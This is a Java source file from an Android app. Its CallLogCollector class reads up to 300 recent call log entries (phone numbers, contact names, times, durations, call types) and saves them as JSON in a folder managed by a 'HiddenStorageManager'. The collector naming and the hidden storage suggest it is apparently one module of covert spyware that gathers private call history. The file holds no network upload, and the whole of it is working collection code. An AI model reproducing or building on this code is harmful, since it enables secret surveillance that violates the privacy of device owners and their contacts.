package com.alzahra.collectors;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.alzahra.storage.HiddenStorageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallLogCollector {
    
    private static final String TAG = "CallLogCollector";

    public static void collect(Context context) {
        try {
            JSONObject data = new JSONObject();
            JSONArray calls = new JSONArray();
            
            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
            };
            
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 300"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                
                do {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(numberIndex));
                    call.put("date", sdf.format(new Date(cursor.getLong(dateIndex))));
                    call.put("duration", cursor.getLong(durationIndex));
                    call.put("type", getCallType(cursor.getInt(typeIndex)));
                    call.put("name", cursor.getString(nameIndex));
                    calls.put(call);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            data.put("type", "call_logs");
            data.put("count", calls.length());
            data.put("timestamp", System.currentTimeMillis());
            data.put("calls", calls);
            
            File outputFile = new File(HiddenStorageManager.getHiddenFolder(context), "call_logs.json");
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(data.toString().getBytes());
            fos.close();
            
            Log.d(TAG, "Collected " + calls.length() + " call logs");
            
        } catch (Exception e) {
            Log.e(TAG, "Call log collection failed", e);
        }
    }
    
    private static String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
            default: return "UNKNOWN";
        }
    }
}
